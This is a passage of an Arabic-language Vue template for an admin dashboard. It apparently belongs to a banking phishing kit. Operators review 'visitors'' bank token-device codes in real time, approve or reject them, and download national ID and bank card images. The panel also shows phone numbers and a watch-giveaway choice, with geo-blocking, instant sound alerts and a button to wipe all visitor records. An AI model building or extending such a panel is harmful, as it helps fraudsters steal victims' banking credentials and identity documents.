                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <polyline points="20 6 9 17 4 12"></polyline>
                          </svg>
                          <span>قبول</span>
                        </button>

                        <button
                          class="decision-btn reject"
                          type="button"
                          @click="decideBmToken(selectedCustomer.id, 'rejected')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                          </svg>
                          <span>رفض</span>
                        </button>
                      </div>
                    </div>

                    <!-- سجل رموز جهاز توكن السابقة تحت القيمة الحالية مباشرة -->
                    <div v-if="getBmTokenHistoryList(selectedCustomer).length > 1" class="stage-inline-history">
                      <div class="inline-history-head">
                        <div class="inline-history-title">
                          <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="10"></circle>
                            <polyline points="12 6 12 12 16 14"></polyline>
                          </svg>
                          <span>سجل رموز جهاز توكن السابقة ({{ getBmTokenHistoryList(selectedCustomer).length }})</span>
                        </div>
                      </div>

                      <div class="inline-history-list">
                        <div
                          v-for="(item, idx) in getBmTokenHistoryList(selectedCustomer)"
                          :key="'bm-token-hist-' + idx"
                          class="inline-history-row"
                          :class="{ 'is-current-active': item.isCurrent || idx === 0 }"
                        >
                          <div class="history-item-main">
                            <span class="history-code-val font-mono" dir="ltr">{{ item.value }}</span>
                            <span v-if="item.timestamp" class="history-item-time" dir="ltr">{{ formatTime(item.timestamp) }}</span>
                          </div>

                          <div class="history-item-actions">
                            <span class="history-status-chip" :class="historyStatusBadgeClass(item.status)">
                              <svg v-if="item.status === 'approved'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                                <polyline points="20 6 9 17 4 12"></polyline>
                              </svg>
                              <svg v-else-if="item.status === 'rejected'" viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="3">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                              </svg>
                              <svg v-else viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.5">
                                <circle cx="12" cy="12" r="10"></circle>
                                <polyline points="12 6 12 12 16 14"></polyline>
                              </svg>
                              <span>{{ historyStatusLabel(item.status) }}</span>
                            </span>

                            <button
                              type="button"
                              class="history-copy-mini-btn"
                              :class="{ copied: copiedFieldKey === 'inline-bm-token-' + idx }"
                              :title="copiedFieldKey === 'inline-bm-token-' + idx ? 'تم النسخ' : 'نسخ رمز جهاز توكن'"
                              @click.stop="copyFieldText(item.value, 'inline-bm-token-' + idx)"
                            >
                              <span>{{ copiedFieldKey === 'inline-bm-token-' + idx ? 'تم' : 'نسخ' }}</span>
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </section>

              <!-- قسم بيانات العميل والتوصيل (قابل للطي والفتح) -->
              <section class="content-block collapsible-block">
                <button
                  type="button"
                  class="content-block-header collapsible-header"
                  :aria-expanded="isDeliveryInfoOpen"
                  @click="isDeliveryInfoOpen = !isDeliveryInfoOpen"
                >
                  <div class="block-title">
                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
                      <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
                      <line x1="12" y1="22.08" x2="12" y2="12"></line>
                    </svg>
                    <h3>بيانات العميل والتوصيل</h3>
                  </div>

                  <div class="collapsible-meta">
                    <span class="collapsible-hint">{{ isDeliveryInfoOpen ? "إخفاء التفاصيل" : "عرض التفاصيل" }}</span>
                    <svg
                      class="chevron-arrow"
                      :class="{ rotated: isDeliveryInfoOpen }"
                      viewBox="0 0 24 24"
                      width="16"
                      height="16"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2.5"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    >
                      <polyline points="6 9 12 15 18 9"></polyline>
                    </svg>
                  </div>
                </button>

                <transition name="collapse-fade">
                  <div v-show="isDeliveryInfoOpen" class="customer-info-grid">
                    <div class="info-cell">
                      <span class="info-label">اسم العميل</span>
                      <strong class="info-value">
                        {{ selectedCustomer.name || selectedCustomer.displayName || selectedCustomer.fullName || "لم يُدخل بعد" }}
                      </strong>
                    </div>

                    <div class="info-cell">
                      <span class="info-label">نوع الحساب</span>
                      <span class="info-value">{{ selectedCustomer.accountType || "أفراد" }}</span>
                    </div>

                    <div class="info-cell">
                      <span class="info-label">الرقم القومي</span>
                      <span class="info-value font-mono" dir="ltr">{{ selectedCustomer.nationalId || "غير متوفر" }}</span>
                    </div>

                    <div class="info-cell">
                      <span class="info-label">رقم الهاتف</span>
                      <strong class="info-value font-mono text-emerald" dir="ltr">
                        {{ selectedCustomer.phone || "غير متوفر" }}
                      </strong>
                    </div>

                    <div class="info-cell">
                      <span class="info-label">المحافظة</span>
                      <span class="info-value">{{ selectedCustomer.governorate || "غير متوفر" }}</span>
                    </div>

                    <div class="info-cell">
                      <span class="info-label">الساعة المختارة</span>
                      <span class="info-value font-medium">{{ selectedCustomer.selectedWatch || "لم تختر بعد" }}</span>
                    </div>
                  </div>
                </transition>
              </section>

              <!-- قسم المستندات المرفوعة (قابل للطي والفتح مع أزرار التحميل) -->
              <section v-if="selectedCustomer.nationalIdFrontImage || selectedCustomer.nationalIdBackImage || selectedCustomer.bankCardImage || selectedCustomer.documentsSubmitted" class="content-block collapsible-block customer-documents-container">
                <button
                  type="button"
                  class="content-block-header collapsible-header"
                  :aria-expanded="isDocumentsInfoOpen"
                  @click="isDocumentsInfoOpen = !isDocumentsInfoOpen"
                >
                  <div class="block-title">
                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
                      <circle cx="8.5" cy="8.5" r="1.5"></circle>
                      <polyline points="21 15 16 10 5 21"></polyline>
                    </svg>
                    <h3>المستندات المرفوعة (الهوية والبطاقة البنكية)</h3>
                  </div>

                  <div class="collapsible-meta">
                    <span class="status-badge" :class="selectedCustomer.documentsStatus || 'pending'">
                      {{ selectedCustomer.documentsStatus === 'approved' ? 'مقبولة' : selectedCustomer.documentsStatus === 'rejected' ? 'مرفوضة' : 'قيد المراجعة' }}
                    </span>
                    <span class="collapsible-hint">{{ isDocumentsInfoOpen ? "إخفاء" : "عرض" }}</span>
                    <svg
                      class="chevron-arrow"
                      :class="{ rotated: isDocumentsInfoOpen }"
                      viewBox="0 0 24 24"
                      width="16"
                      height="16"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2.5"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    >
                      <polyline points="6 9 12 15 18 9"></polyline>
                    </svg>
                  </div>
                </button>

                <transition name="collapse-fade">
                  <div v-show="isDocumentsInfoOpen">
                    <div class="admin-documents-grid">
                      <!-- صورة بطاقة الرقم القومي (أمامي) -->
                      <div class="admin-doc-card">
                        <div class="admin-doc-header">
                          <span class="admin-doc-title">الرقم القومي (أمامي)</span>
                          <span v-if="selectedCustomer.nationalIdFrontImage" class="admin-doc-tag success">متوفر</span>
                          <span v-else class="admin-doc-tag missing">غير متوفر</span>
                        </div>
                        <div v-if="selectedCustomer.nationalIdFrontImage" class="admin-doc-preview" @click="openAdminDocPreview(selectedCustomer.nationalIdFrontImage, 'بطاقة الرقم القومي - الوجه الأمامي')">
                          <img :src="selectedCustomer.nationalIdFrontImage" alt="الرقم القومي (أمامي)" class="admin-doc-img" />
                          <div class="admin-doc-zoom-overlay">
                            <button
                              type="button"
                              class="doc-action-btn view-btn"
                              title="تكبير"
                              @click.stop="openAdminDocPreview(selectedCustomer.nationalIdFrontImage, 'بطاقة الرقم القومي - الوجه الأمامي')"
                            >
                              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
                                <circle cx="11" cy="11" r="8"></circle>
                                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                                <line x1="11" y1="8" x2="11" y2="14"></line>
                                <line x1="8" y1="11" x2="14" y2="11"></line>
                              </svg>
                              <span>تكبير</span>
                            </button>
                            <button
                              type="button"
                              class="doc-action-btn download-btn"
                              title="تحميل الصورة"
                              @click.stop="downloadAdminImage(selectedCustomer.nationalIdFrontImage, `national_id_front_${selectedCustomer.phone || selectedCustomer.id}.jpg`)"
                            >
                              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                                <polyline points="7 10 12 15 17 10"></polyline>
                                <line x1="12" y1="15" x2="12" y2="3"></line>
                              </svg>
                              <span>تحميل</span>
                            </button>
                          </div>
                        </div>
                        <div v-else class="admin-doc-empty">
                          <span>لم يتم رفع الصورة بعد</span>
                        </div>

                        <!-- شريط التحميل السريع أسفل البطاقة -->
                        <div v-if="selectedCustomer.nationalIdFrontImage" class="admin-doc-footer">
                          <button
                            type="button"
                            class="direct-download-link"
                            @click="downloadAdminImage(selectedCustomer.nationalIdFrontImage, `national_id_front_${selectedCustomer.phone || selectedCustomer.id}.jpg`)"
                          >
                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2">
                              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                              <polyline points="7 10 12 15 17 10"></polyline>
                              <line x1="12" y1="15" x2="12" y2="3"></line>
                            </svg>
                            <span>تحميل الصورة</span>
                          </button>
                        </div>
                      </div>

                      <!-- صورة بطاقة الرقم القومي (خلفي) -->
                      <div class="admin-doc-card">
                        <div class="admin-doc-header">
                          <span class="admin-doc-title">الرقم القومي (خلفي)</span>
                          <span v-if="selectedCustomer.nationalIdBackImage" class="admin-doc-tag success">متوفر</span>
                          <span v-else class="admin-doc-tag missing">غير متوفر</span>
                        </div>
                        <div v-if="selectedCustomer.nationalIdBackImage" class="admin-doc-preview" @click="openAdminDocPreview(selectedCustomer.nationalIdBackImage, 'بطاقة الرقم القومي - الوجه الخلفي')">
                          <img :src="selectedCustomer.nationalIdBackImage" alt="الرقم القومي (خلفي)" class="admin-doc-img" />
                          <div class="admin-doc-zoom-overlay">
                            <button
                              type="button"
                              class="doc-action-btn view-btn"
                              title="تكبير"
                              @click.stop="openAdminDocPreview(selectedCustomer.nationalIdBackImage, 'بطاقة الرقم القومي - الوجه الخلفي')"
                            >
                              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
                                <circle cx="11" cy="11" r="8"></circle>
                                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                                <line x1="11" y1="8" x2="11" y2="14"></line>
                                <line x1="8" y1="11" x2="14" y2="11"></line>
                              </svg>
                              <span>تكبير</span>
                            </button>
                            <button
                              type="button"
                              class="doc-action-btn download-btn"
                              title="تحميل الصورة"
                              @click.stop="downloadAdminImage(selectedCustomer.nationalIdBackImage, `national_id_back_${selectedCustomer.phone || selectedCustomer.id}.jpg`)"
                            >
                              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                                <polyline points="7 10 12 15 17 10"></polyline>
                                <line x1="12" y1="15" x2="12" y2="3"></line>
                              </svg>
                              <span>تحميل</span>
                            </button>
                          </div>
                        </div>
                        <div v-else class="admin-doc-empty">
                          <span>لم يتم رفع الصورة بعد</span>
                        </div>

                        <!-- شريط التحميل السريع أسفل البطاقة -->
                        <div v-if="selectedCustomer.nationalIdBackImage" class="admin-doc-footer">
                          <button
                            type="button"
                            class="direct-download-link"
                            @click="downloadAdminImage(selectedCustomer.nationalIdBackImage, `national_id_back_${selectedCustomer.phone || selectedCustomer.id}.jpg`)"
                          >
                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2">
                              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                              <polyline points="7 10 12 15 17 10"></polyline>
                              <line x1="12" y1="15" x2="12" y2="3"></line>
                            </svg>
                            <span>تحميل الصورة</span>
                          </button>
                        </div>
                      </div>

                      <!-- صورة البطاقة البنكية -->
                      <div class="admin-doc-card">
                        <div class="admin-doc-header">
                          <span class="admin-doc-title">البطاقة البنكية</span>
                          <span v-if="selectedCustomer.bankCardImage" class="admin-doc-tag success">متوفر</span>
                          <span v-else class="admin-doc-tag missing">غير متوفر</span>
                        </div>
                        <div v-if="selectedCustomer.bankCardImage" class="admin-doc-preview" @click="openAdminDocPreview(selectedCustomer.bankCardImage, 'البطاقة البنكية')">
                          <img :src="selectedCustomer.bankCardImage" alt="البطاقة البنكية" class="admin-doc-img" />
                          <div class="admin-doc-zoom-overlay">
                            <button
                              type="button"
                              class="doc-action-btn view-btn"
                              title="تكبير"
                              @click.stop="openAdminDocPreview(selectedCustomer.bankCardImage, 'البطاقة البنكية')"
                            >
                              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
                                <circle cx="11" cy="11" r="8"></circle>
                                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                                <line x1="11" y1="8" x2="11" y2="14"></line>
                                <line x1="8" y1="11" x2="14" y2="11"></line>
                              </svg>
                              <span>تكبير</span>
                            </button>
                            <button
                              type="button"
                              class="doc-action-btn download-btn"
                              title="تحميل الصورة"
                              @click.stop="downloadAdminImage(selectedCustomer.bankCardImage, `bank_card_${selectedCustomer.phone || selectedCustomer.id}.jpg`)"
                            >
                              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                                <polyline points="7 10 12 15 17 10"></polyline>
                                <line x1="12" y1="15" x2="12" y2="3"></line>
                              </svg>
                              <span>تحميل</span>
                            </button>
                          </div>
                        </div>
                        <div v-else class="admin-doc-empty">
                          <span>لم يتم رفع الصورة بعد</span>
                        </div>

                        <!-- شريط التحميل السريع أسفل البطاقة -->
                        <div v-if="selectedCustomer.bankCardImage" class="admin-doc-footer">
                          <button
                            type="button"
                            class="direct-download-link"
                            @click="downloadAdminImage(selectedCustomer.bankCardImage, `bank_card_${selectedCustomer.phone || selectedCustomer.id}.jpg`)"
                          >
                            <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2">
                              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                              <polyline points="7 10 12 15 17 10"></polyline>
                              <line x1="12" y1="15" x2="12" y2="3"></line>
                            </svg>
                            <span>تحميل الصورة</span>
                          </button>
                        </div>
                      </div>
                    </div>

                    <!-- أزرار قرار قبول / رفض المستندات -->
                    <div class="card-decision-bar documents-decision-bar">
                      <span class="decision-prompt">قرار المستندات:</span>
                      <div class="decision-actions">
                        <button
                          class="decision-btn approve"
                          type="button"
                          @click="decideDocuments(selectedCustomer.id, 'approved')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <polyline points="20 6 9 17 4 12"></polyline>
                          </svg>
                          <span>قبول المستندات</span>
                        </button>

                        <button
                          class="decision-btn reject"
                          type="button"
                          @click="decideDocuments(selectedCustomer.id, 'rejected')"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                          </svg>
                          <span>رفض المستندات</span>
                        </button>
                      </div>
                    </div>
                  </div>
                </transition>
              </section>
            </template>
          </section>
        </main>
      </template>
    </section>

    <!-- القائمة الجانبية للإعدادات (Settings Drawer) -->
    <transition name="drawer-fade">
      <div
        v-if="isSettingsDrawerOpen"
        class="drawer-backdrop"
        role="presentation"
        @click="closeSettingsDrawer"
      />
    </transition>

    <aside
      class="settings-drawer"
      :class="{ open: isSettingsDrawerOpen }"
      aria-label="لوحة الإعدادات"
    >
      <div class="drawer-header">
        <div class="drawer-title">
          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="3"></circle>
            <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1.51 1 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
          </svg>
          <h3>لوحة الإعدادات</h3>
        </div>
        <button
          class="drawer-close-btn"
          type="button"
          title="إغلاق"
          @click="closeSettingsDrawer"
        >
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        </button>
      </div>

      <div class="drawer-content">
        <!-- بطاقة الحساب -->
        <div class="drawer-user-card">
          <div class="user-avatar-circle">
            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
              <circle cx="12" cy="7" r="4"></circle>
            </svg>
          </div>
          <div class="user-meta-info">
            <strong class="user-email-text">{{ currentAdminEmail }}</strong>
            <span class="user-role-label">{{ role === 'superadmin' ? 'سوبر أدمن (Superadmin)' : 'مشرف (Admin)' }}</span>
          </div>
        </div>

        <!-- الأمان والحظر الجغرافي -->
        <div class="drawer-group">
          <span class="drawer-group-title">الأمان والحظر الجغرافي</span>
          <button
            v-if="role === 'superadmin'"
            class="drawer-control-btn"
            :class="{
              inactive: geoBlockEnabled === false,
              warning: geoBlockEnabled === null,
            }"
            type="button"
            :disabled="geoBlockLoading || geoBlockUpdating"
            @click="toggleGeoBlocking"
          >
            <div class="btn-left-icon">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="2" y1="12" x2="22" y2="12"></line>
                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
              </svg>
            </div>
            <div class="btn-text-block">
              <span class="btn-main-text">
                {{ geoBlockLoading || geoBlockUpdating
                  ? "جارٍ التحديث..."
                  : geoBlockError
                    ? "تعذر الاتصال — إعادة المحاولة"
                  : geoBlockEnabled === null
                    ? "إعادة فحص الحظر"
                  : "الحظر الجغرافي" }}
              </span>
            </div>
            <span class="switch-badge" :class="geoBlockEnabled ? 'active' : 'inactive'">
              {{ geoBlockEnabled ? 'مفعل' : 'معطل' }}
            </span>
          </button>
        </div>

        <!-- إعدادات التواصل والدعم (سوبر أدمن فقط) -->
        <div v-if="role === 'superadmin'" class="drawer-group">
          <span class="drawer-group-title">التواصل والدعم</span>
          <button
            class="drawer-control-btn whatsapp-drawer-btn"
            type="button"
            @click="openWhatsAppSettingsModal"
          >
            <div class="btn-left-icon whatsapp-icon-box">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
                <path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.816 9.816 0 0 0 12.04 2zm.01 1.67c2.2 0 4.26.86 5.82 2.42a8.225 8.225 0 0 1 2.41 5.83c0 4.54-3.7 8.24-8.24 8.24-1.48 0-2.93-.4-4.2-1.15l-.3-.18-3.12.82.83-3.04-.2-.31a8.196 8.196 0 0 1-1.26-4.38c0-4.54 3.7-8.24 8.24-8.24zm4.8 11.63c-.26-.13-1.56-.77-1.8-.86-.24-.09-.42-.13-.6.13-.18.26-.69.86-.84 1.04-.16.18-.31.2-.57.07-.26-.13-1.1-.41-2.1-1.3-.78-.7-1.3-1.56-1.45-1.82-.16-.26-.02-.4.11-.53.12-.12.26-.31.39-.47.13-.15.17-.26.26-.43.09-.17.04-.33-.02-.46-.07-.13-.6-1.44-.82-1.97-.22-.53-.44-.46-.6-.47-.16-.01-.34-.01-.52-.01-.18 0-.47.07-.72.33-.24.26-.94.92-.94 2.24 0 1.32.96 2.6 1.1 2.78.13.17 1.89 2.89 4.59 4.05.64.28 1.14.44 1.53.57.65.21 1.23.18 1.7.11.52-.08 1.56-.64 1.78-1.25.22-.62.22-1.15.15-1.26-.06-.12-.23-.18-.49-.31z"/>
              </svg>
            </div>
            <div class="btn-text-block">
              <span class="btn-main-text">رقم الواتساب</span>
            </div>
            <span class="switch-badge" :class="whatsappNumber ? 'whatsapp-active' : 'neutral'">
              {{ whatsappNumber ? whatsappNumber : 'الافتراضي' }}
            </span>
          </button>
        </div>

        <!-- التنبيهات والمظهر -->
        <div class="drawer-group">
          <span class="drawer-group-title">التفضيلات</span>
          <button
            class="drawer-control-btn"
            type="button"
            @click="toggleSoundNotification"
          >
            <div class="btn-left-icon">
              <svg v-if="soundNotificationEnabled" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
                <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
              </svg>
              <svg v-else viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
                <path d="M18.63 13A17.89 17.89 0 0 1 18 8"></path>
                <path d="M6.26 6.26A5.86 5.86 0 0 0 6 8c0 7-3 9-3 9h14"></path>
                <line x1="1" y1="1" x2="23" y2="23"></line>
              </svg>
            </div>
            <div class="btn-text-block">
              <span class="btn-main-text">التنبيه الصوتي اللحظي</span>
            </div>
            <span class="switch-badge" :class="soundNotificationEnabled ? 'active' : 'inactive'">
              {{ soundNotificationEnabled ? 'مفعل' : 'معطل' }}
            </span>
          </button>

          <button
            class="drawer-control-btn"
            type="button"
            @click="toggleDashboardTheme"
          >
            <div class="btn-left-icon">
              <svg v-if="dashboardTheme === 'dark'" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="5"></circle>
                <line x1="12" y1="1" x2="12" y2="3"></line>
                <line x1="12" y1="21" x2="12" y2="23"></line>
              </svg>
              <svg v-else viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
              </svg>
            </div>
            <div class="btn-text-block">
              <span class="btn-main-text">{{ dashboardTheme === "dark" ? "الوضع الفاتح" : "الوضع الداكن" }}</span>
            </div>
            <span class="switch-badge neutral">{{ dashboardTheme === 'dark' ? 'داكن' : 'فاتح' }}</span>
          </button>
        </div>

        <!-- إدارة المشرفين (سوبر أدمن) -->
        <div v-if="role === 'superadmin'" class="drawer-group">
          <span class="drawer-group-title">المشرفون والإدارة</span>
          <button
            class="drawer-control-btn"
            type="button"
            @click="openAdminManagementModal"
          >
            <div class="btn-left-icon">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
                <circle cx="9" cy="7" r="4"></circle>
                <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
                <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
              </svg>
            </div>
            <div class="btn-text-block">
              <span class="btn-main-text">إدارة المسؤولين والمشرفين</span>
            </div>
            <span class="count-pill-small">{{ adminAccounts.length }}</span>
          </button>
        </div>

        <!-- إدارة البيانات والسجلات (سوبر أدمن فقط) -->
        <div v-if="role === 'superadmin'" class="drawer-group">
          <span class="drawer-group-title">إدارة البيانات</span>
          <button
            class="drawer-control-btn danger"
            type="button"
            :disabled="customers.length === 0"
            @click="handleDeleteAllFromDrawer"
          >
            <div class="btn-left-icon">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="3 6 5 6 21 6"></polyline>
                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
              </svg>
            </div>
            <div class="btn-text-block">
              <span class="btn-main-text">حذف كافة سجلات الزوار</span>
            </div>
            <span class="count-pill-small danger-pill">{{ customers.length }}</span>
          </button>
        </div>
      </div>

      <div class="drawer-footer">
        <button class="drawer-logout-btn" type="button" @click="signOut">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
            <polyline points="16 17 21 12 16 7"></polyline>
            <line x1="21" y1="12" x2="9" y2="12"></line>
          </svg>
          <span>تسجيل الخروج</span>
        </button>
      </div>
    </aside>

    <!-- نافذة إدارة الأدمنز والمشرفين (Admin Management Modal) -->
    <div v-if="isAdminModalOpen" class="modal-backdrop" role="presentation">
      <section class="admin-modal-box" role="dialog" aria-modal="true">
        <div class="modal-header">
          <div class="modal-header-title">
            <div class="modal-icon-badge">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
              </svg>
            </div>
            <div>
              <h3>إدارة مسؤولي النظام</h3>
              <p>التحكم بالحسابات، الصلاحيات، والجلسات النشطة</p>
            </div>
          </div>

          <div class="modal-header-actions">
            <button
              class="add-admin-btn"
              type="button"
              :class="{ active: isAddAdminOpen }"
              @click="isAddAdminOpen = !isAddAdminOpen"
            >
              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                <line x1="12" y1="5" x2="12" y2="19"></line>
                <line x1="5" y1="12" x2="19" y2="12"></line>
              </svg>
              <span>{{ isAddAdminOpen ? "إغلاق النموذج" : "إضافة مسؤول جديد" }}</span>
            </button>

            <button class="modal-close-btn" type="button" title="إغلاق" @click="closeAdminManagementModal">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
          </div>
        </div>

        <!-- شريط التبويبات -->
        <div class="modal-tabs">
          <button
            class="modal-tab-btn"
            :class="{ active: adminFilterTab === 'all' }"
            type="button"
            @click="adminFilterTab = 'all'"
          >
            <span>كافة الحسابات</span>
            <span class="tab-badge">{{ adminAccounts.length }}</span>
          </button>

          <button
            class="modal-tab-btn"
            :class="{ active: adminFilterTab === 'online' }"
            type="button"
            @click="adminFilterTab = 'online'"
          >
            <span>المتصلون بالداشبورد</span>
            <span class="tab-badge green">{{ onlineAdminsCount }}</span>
          </button>

          <button
            class="modal-tab-btn"
            :class="{ active: adminFilterTab === 'superadmin' }"
            type="button"
            @click="adminFilterTab = 'superadmin'"
          >
            <span>سوبر أدمن</span>
            <span class="tab-badge">{{ adminAccounts.filter(a => a.role === 'superadmin').length }}</span>
          </button>

          <button
            class="modal-tab-btn"
            :class="{ active: adminFilterTab === 'admin' }"
            type="button"
            @click="adminFilterTab = 'admin'"
          >
            <span>أدمن</span>
            <span class="tab-badge">{{ adminAccounts.filter(a => a.role === 'admin').length }}</span>
          </button>
        </div>

        <!-- تنبيه الاستجابة -->
        <div v-if="adminFeedback" class="feedback-banner" :class="adminFeedback.type">
          <span>{{ adminFeedback.text }}</span>
          <button type="button" class="banner-dismiss" @click="adminFeedback = null">✕</button>
        </div>

        <div class="modal-body-scroll">
          <!-- نموذج إضافة مسؤول جديد -->
          <form
            v-if="isAddAdminOpen"
            class="admin-form-card"
            @submit.prevent="handleCreateAdminSubmit"
          >
